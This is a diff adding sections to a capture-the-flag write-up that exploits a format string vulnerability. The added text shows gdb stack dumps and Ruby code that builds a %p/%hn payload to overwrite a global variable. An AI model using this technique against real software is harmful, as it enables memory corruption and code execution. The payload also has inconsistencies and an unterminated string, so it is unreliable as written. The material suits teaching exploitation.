@@ -160,3 +160,125 @@ see that it includes:
 4. `0xffffd0a8`: a pointer to `chars_sent`
 
 Pretty cool, eh?
+
+## More Recon
+
+Let's see what's on the stack when we call `hacker_level`'s printf:
+
+```
+(gdb) b printf
+Breakpoint 1 at 0x8048490
+(gdb) r
+Starting program: /home/ubuntu/hacker_level
+
+Breakpoint 1, 0xf7e4fa90 in printf () from /lib32/libc.so.6
+(gdb) c
+Continuing.
+What's your name? vito
+
+Breakpoint 1, 0xf7e4fa90 in printf () from /lib32/libc.so.6
+(gdb) c
+Continuing.
+Hello,
+Breakpoint 1, 0xf7e4fa90 in printf () from /lib32/libc.so.6
+(gdb) x/32x $esp
+0xffffcfec:	0x08048611	0xffffd00c	0x00000040	0xf7fba600
+0xffffcffc:	0xffffd078	0xffffd0c0	0xf7fe3570	0xffffd070
+0xffffd00c:	0x6f746976	0x0000000a	0x00000000	0x00000000
+0xffffd01c:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd02c:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd03c:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd04c:	0x00000000	0xf7ffdaf0	0xffffd070	0xf7ffd938
+0xffffd05c:	0x08048333	0x00000000	0xffffd104	0x00000001
+```
+
+I grabbed more pointers this time around because I still haven't found what I'm
+looking for.
+
+1. `0x08048611`: `hacker_level.c:21`
+2. `0xffffd00c`: the name I entered: `vito\n`
+3. `0x00000040`: 64, probably an argument to fgets?
+4. `0xf7fba600`: pointer to the FILE* stdin
+5. `0xffffd078`: bottom of next stack frame
+6. `0xffffd0c0`: top of next stack frame
+7. `0xf7fe3570`: something in libc?
+8. `0xffffd070`: top of the current stack frame?
+9. `0x6f746976`: this is "vito" in ASCII, as referred to by #2 above
+
+So: the pointer to our format string `vito\n` is the first argument to `printf`,
+we have a half-dozen pointers we don't care about, and then we have stack space
+we control.
+
+We can use the first four bytes of our format string as a pointer, make sure we
+output enough bytes to set it to the correct value, and then we should finally
+be leet.
+
+How many bytes is 0xCCC31337 anyways? It's 3,435,336,503 bytes, or most of a
+DVD. So, this just got a bit harder: we have to do it in stages. We'll try to
+output 0x00001337 directly on `level`, and then 0x0000CCC1 at `level + 2`.
+
+Our format string now needs:
+
+1. Address for `level`
+2. Something to consume during step 7
+3. Address for `level - 4`
+4. Formats to consume six four-byte values from the stack
+5. A format that pushes us up to 0x1337 bytes output
+6. `%n` to write into `level`
+7. A format that pushes us up to 0xCCC3 bytes output
+8. `%n` to write into `level - 4`
+
+## Hackin' & Drinkin'
+
+This part is frustrating!
+
+I didn't want to be reëncoding things over and over again, so I used `pry`, a
+Ruby REPL/interpreter, to build strings.
+
+My starting components were the two addresses, `level` and `level_2`. The
+`level` address needs to target the 16 least-significant-bits of the `level` C
+global, and `level_2` needs to target the 16 most-significant-bits.
+
+From `gdb`, we find that `level` is at 0x0804a04c:
+
+```
+(gdb) p &level
+$26 = (uint32_t *) 0x804a04c <level>
+```
+
+So we build these variables in pry:
+
+```ruby
+level   = "\x4e\xa0\x04\08"
+level_2 = "\x4c\xa0\x04\08"
+```
+
+Next, after much frustration (shout out to bspar, duck, and the lulzsec crew for
+emotional support!), I came up with these format string components to load
+`0x1337` and `0xCCC1` into the two halves of the variable:
+
+```ruby
+fmt_1337 = "AAAA#{level_2}AAAA#{level}%p%p%p%p%p%#{leet - (4 + 62)}x%p"
+fmt_ccc1 = "%#{0xccc1 - 0x1337 + 2}c"
+```
+
+In `fmt_1337`, the four "A"s take up space because debugging is hard, `level_2`
+should be self-explanatory, the next four "A"s allow us to output a `%c` in
+`fmt_ccc1`, and `level` gives us an address to write 0xccc1 to. The next five
+`%p` elements consume some stack entries before we get to the current string.
+The `leet - 66`-length hex output writes the first consumes one more stack
+entry, and the last `%p` consumes the first four "A"s (again: debugging is hard,
+especially when you've been drinking!).
+
+`fmt_ccc1` is comparatively simpler: we make sure to eat up the right number of
+bytes.
+
+To build the final string, we write half-word size counts of characters
+instead of full-words:
+
+```ruby
+fmt = fmt_1337 + "%hn" + fmt_ccc1 + "%hn
+```
+
+From this, we can write this to a file, and send it to the remote server, and
+get the flag!
